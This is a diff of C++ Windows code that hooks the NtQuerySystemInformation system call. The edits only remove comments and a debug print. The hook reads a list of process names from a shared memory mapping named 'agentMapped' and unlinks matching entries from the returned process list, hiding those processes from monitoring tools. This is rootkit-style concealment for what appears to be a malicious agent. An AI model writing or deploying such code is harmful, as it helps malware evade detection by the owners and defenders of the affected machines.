@@ -23,14 +23,9 @@ typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
 NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;
 
 std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
-    // Abrir el archivo mapeado
     HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
     LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
-
-    // Obtener los datos serializados
     std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
-
-    // Convertir std::wstring de nuevo a wchar_t*
     std::vector<wchar_t*> deserializedData;
     size_t pos = 0;
     wchar_t* token;
@@ -48,14 +43,11 @@ std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
         token[serializedData.size()] = L'\0';
         deserializedData.push_back(token);
     }
-
-
     return deserializedData;
 }
 
 
 NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
-    OutputDebugStringW(L"sadas");
     vector<wchar_t*> agentVector = deserializeWCharTPointerVector(L"agentMapped");
     NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
@@ -65,15 +57,11 @@ NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInf
 
         while (true) {
             if (pCurrent->ImageName.Buffer != NULL) {
-                // Utilizar std::find para buscar el nombre del proceso en el vector
                 const auto it = std::find_if(agentVector.begin(), agentVector.end(),
                     [pCurrent](const wchar_t* nombreProceso) {
                         return wcsstr(pCurrent->ImageName.Buffer, nombreProceso) != NULL;
                     });
-
-                // Verificar si se encontró el proceso en la lista
                 if (it != agentVector.end()) {
-                    
                     if (pPrevious == NULL) {
                         pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                         if (pCurrent->NextEntryOffset != 0) {
